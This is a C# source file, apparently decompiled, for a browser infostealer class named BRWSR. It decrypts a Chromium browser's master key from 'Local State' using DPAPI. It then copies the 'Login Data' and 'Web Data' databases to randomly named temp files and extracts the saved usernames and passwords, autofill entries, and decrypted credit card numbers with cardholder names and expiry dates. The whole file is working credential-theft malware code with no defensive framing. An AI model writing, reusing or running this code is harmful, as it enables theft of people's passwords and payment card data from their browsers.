using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace SHARP
{
    internal class BRWSR
    {
      internal static string GenerateRandomString(int length)
      {
        Random random = new Random();
        string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        StringBuilder stringBuilder = new StringBuilder();
        for (int index = 0; index < length; ++index)
          stringBuilder.Append(str[random.Next(0, str.Length)]);
        return stringBuilder.ToString();
      }

      private static string ExtractEncryptedKey(string text)
      {
        int num1 = text.IndexOf("\"encrypted_key\":\"", StringComparison.Ordinal);
        if (num1 == -1)
          return (string) null;
        int startIndex = num1 + "\"encrypted_key\":\"".Length;
        int num2 = text.IndexOf("\"", startIndex, StringComparison.Ordinal);
        return num2 == -1 ? (string) null : text.Substring(startIndex, num2 - startIndex);
      }

      public static async Task<byte[]> GetEncryptionKey(string BrowserPath)
      {
        byte[] key = (byte[]) null;
        string path = Path.Combine(BrowserPath, "Local State");
        if (File.Exists(path))
        {
          try
          {
            string endAsync;
            using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
              using (StreamReader reader = new StreamReader((Stream) fs))
                endAsync = await reader.ReadToEndAsync();
            }
            key = ProtectedData.Unprotect(((IEnumerable<byte>) Convert.FromBase64String(BRWSR.ExtractEncryptedKey(endAsync))).Skip<byte>(5).ToArray<byte>(), (byte[]) null, DataProtectionScope.CurrentUser);
          }
          catch (Exception ex)
          {
            Console.WriteLine(ex.ToString());
          }
        }
        byte[] encryptionKey = key == null ? (byte[]) null : key;
        key = (byte[]) null;
        return encryptionKey;
      }

      private static byte[] DecryptData(byte[] buffer, byte[] key)
      {
        byte[] numArray = (byte[]) null;
        if (key == null)
          return (byte[]) null;
        try
        {
          string str = Encoding.Default.GetString(buffer);
          if (str.StartsWith("v10") || str.StartsWith("v11"))
          {
            byte[] array1 = ((IEnumerable<byte>) buffer).Skip<byte>(3).Take<byte>(12).ToArray<byte>();
            byte[] array2 = ((IEnumerable<byte>) buffer).Skip<byte>(15).ToArray<byte>();
            byte[] array3 = ((IEnumerable<byte>) array2).Skip<byte>(array2.Length - 16 /*0x10*/).ToArray<byte>();
            byte[] array4 = ((IEnumerable<byte>) array2).Take<byte>(array2.Length - array3.Length).ToArray<byte>();
            numArray = new AesGcm().Decrypt(key, array1, (byte[]) null, array4, array3);
          }
          else
            numArray = ProtectedData.Unprotect(buffer, (byte[]) null, DataProtectionScope.CurrentUser);
        }
        catch (Exception ex)
        {
          Console.WriteLine($"Failed to decrypt {ex}");
        }
        return numArray;
      }

      public static async Task<PasswordFormat[]> GetPasswords(string BrowserPath, byte[] key)
      {
        List<PasswordFormat> passwords = new List<PasswordFormat>();
        foreach (string sourceFileName in await Task.Run<string[]>((Func<string[]>) (() => Directory.GetFiles(BrowserPath, "Login Data", SearchOption.AllDirectories))))
        {
          try
          {
            string str;
            do
            {
              str = Path.Combine(Path.GetTempPath(), BRWSR.GenerateRandomString(30));
            }
            while (File.Exists(str));
            File.Copy(sourceFileName, str);
            SQLiteHandler sqLiteHandler = new SQLiteHandler(str);
            if (sqLiteHandler.ReadTable("logins"))
            {
              for (int row_num = 0; row_num < sqLiteHandler.GetRowCount(); ++row_num)
              {
                string url = sqLiteHandler.GetValue(row_num, "origin_url");
                string username = sqLiteHandler.GetValue(row_num, "username_value");
                byte[] bytes = BRWSR.DecryptData(Encoding.Default.GetBytes(sqLiteHandler.GetValue(row_num, "password_value")), key);
                if (!string.IsNullOrWhiteSpace(url) && !string.IsNullOrWhiteSpace(username) && bytes != null && bytes.Length != 0)
                  passwords.Add(new PasswordFormat(username, Encoding.UTF8.GetString(bytes), url));
              }
              File.Delete(str);
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
        }
        PasswordFormat[] array = passwords.ToArray();
        passwords = (List<PasswordFormat>) null;
        return array;
      }

      private static string GetUTF8(string sNonUtf8)
      {
        try
        {
          return Encoding.UTF8.GetString(Encoding.Default.GetBytes(sNonUtf8));
        }
        catch
        {
          return sNonUtf8;
        }
      }

      public static async Task<AutoFilesFormat[]> GetAutoFiles(string BrowserPath)
      {
        List<AutoFilesFormat> autofiles = new List<AutoFilesFormat>();
        foreach (string sourceFileName in await Task.Run<string[]>((Func<string[]>) (() => Directory.GetFiles(BrowserPath, "Web Data", SearchOption.AllDirectories))))
        {
          try
          {
            string str;
            do
            {
              str = Path.Combine(Path.GetTempPath(), BRWSR.GenerateRandomString(20));
            }
            while (File.Exists(str));
            File.Copy(sourceFileName, str);
            SQLiteHandler sqLiteHandler = new SQLiteHandler(str);
            if (sqLiteHandler.ReadTable("autofill"))
            {
              for (int row_num = 0; row_num < sqLiteHandler.GetRowCount(); ++row_num)
              {
                string utF8_1 = BRWSR.GetUTF8(sqLiteHandler.GetValue(row_num, "name"));
                string utF8_2 = BRWSR.GetUTF8(sqLiteHandler.GetValue(row_num, "value"));
                if (utF8_1 != null && utF8_2 != null)
                  autofiles.Add(new AutoFilesFormat(utF8_1, utF8_2));
              }
              File.Delete(str);
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
        }
        AutoFilesFormat[] array = autofiles.ToArray();
        autofiles = (List<AutoFilesFormat>) null;
        return array;
      }

      internal static async Task<CreditCardFormat[]> GetCreditCards(string BrowserPath, byte[] key)
      {
        List<CreditCardFormat> creditcards = new List<CreditCardFormat>();
        foreach (string sourceFileName in await Task.Run<string[]>((Func<string[]>) (() => Directory.GetFiles(BrowserPath, "Web Data", SearchOption.AllDirectories))))
        {
          try
          {
            string str = Path.Combine(Path.GetTempPath(), BRWSR.GenerateRandomString(37));
            File.Copy(sourceFileName, str);
            SQLiteHandler sqLiteHandler = new SQLiteHandler(str);
            if (sqLiteHandler.ReadTable("credit_cards"))
            {
              for (int row_num = 0; row_num < sqLiteHandler.GetRowCount(); ++row_num)
              {
                byte[] bytes1 = Encoding.Default.GetBytes(sqLiteHandler.GetValue(row_num, "card_number_encrypted"));
                Console.WriteLine(sqLiteHandler.GetValue(row_num, "card_number_encrypted"));
                string utF8_1 = BRWSR.GetUTF8(sqLiteHandler.GetValue(row_num, "name_on_card"));
                string utF8_2 = BRWSR.GetUTF8(sqLiteHandler.GetValue(row_num, "expiration_month"));
                string utF8_3 = BRWSR.GetUTF8(sqLiteHandler.GetValue(row_num, "expiration_year"));
                byte[] key1 = key;
                byte[] bytes2 = BRWSR.DecryptData(bytes1, key1);
                if (bytes2 != null)
                  creditcards.Add(new CreditCardFormat(Encoding.UTF8.GetString(bytes2), utF8_3, utF8_2, utF8_1));
              }
              File.Delete(str);
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
        }
        CreditCardFormat[] array = creditcards.ToArray();
        creditcards = (List<CreditCardFormat>) null;
        return array;
      }
    }
}
